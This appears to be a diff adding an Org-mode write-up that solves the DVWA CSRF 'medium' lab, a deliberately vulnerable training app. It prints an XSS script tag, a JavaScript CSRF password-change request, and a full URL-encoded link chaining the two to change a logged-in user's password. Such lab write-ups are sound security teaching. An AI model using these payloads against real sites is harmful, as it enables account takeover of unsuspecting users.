@@ -1,0 +1,63 @@
+#+TITLE: DVWA - CSRF Medium
+#+AUTHOR: Leonardo Tamiano
+
+* Description
+  The difference from *low* to *medium* is that now the server checks from
+  where it originated the query to change the password. If it
+  originated from a domain other than the origin domain of the *dvwa*
+  app, then the request is not considered valid. Otherwise it is.
+
+  This means that we cannot simply make the user click the link
+  pointing to the CSRF change password endpoint, as in that case the
+  origin would be a different site.
+  
+* Solution
+  First we could think of creating a fake HTML page with some
+  javascript that triggers a password request to the DVWA site.
+
+  #+begin_src html
+<html>
+  <head>
+    <title> Test! </title>
+    <Script>
+      var xmlHttp = new XMLHttpRequest();
+      var url = "http://evil/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change";
+      xmlHttp.open("GET", url, false);
+      xmlHttp.send(null);
+    </Script>
+  </head>
+  <body>
+    <h1>Hi!</h1>    
+  </body>
+</html>
+  #+end_src
+
+  This approach however does not work because of *CORS*. In particular
+  the http://evil website, which is the DVWA, has not enabled CORS,
+  and therefore we're not able to use javascript to request data from
+  that website using a different origin, which we would be forced to
+  were we to attack a client using our html payload.
+
+  To actually weaponize this *CSRF* we need an *XSS* witin the origin of
+  interest, which in my particular case is http://evil. For example,
+  consider the *XSS* of the *XSS reflected medium* section. We can trigger
+  that xss as follows
+
+  #+begin_src html
+<Script> alert("1"); </Script>
+  #+end_src
+
+  Using this XSS we can trigger the malicious password change request
+  with the following XSS script
+
+  #+begin_src html
+<Script> var xmlHttp = new XMLHttpRequest(); var url = "http://evil/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change"; xmlHttp.open("GET", url, false); xmlHttp.send(null); </Script>
+  #+end_src
+
+  By chaning the XSS with the CSRF we get the following link, which,
+  when clicks, changes the password of the currently authenticated
+  user within the DVWA platform
+
+  #+begin_example
+http://evil/vulnerabilities/xss_r/?name=%3CScript%3E+var+xmlHttp+%3D+new+XMLHttpRequest%28%29%3B+var+url+%3D+%22http%3A%2F%2Fevil%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dtest%26password_conf%3Dtest%26Change%3DChange%22%3B+xmlHttp.open%28%22GET%22%2C+url%2C+false%29%3B+xmlHttp.send%28null%29%3B+%3C%2FScript%3E
+  #+end_example
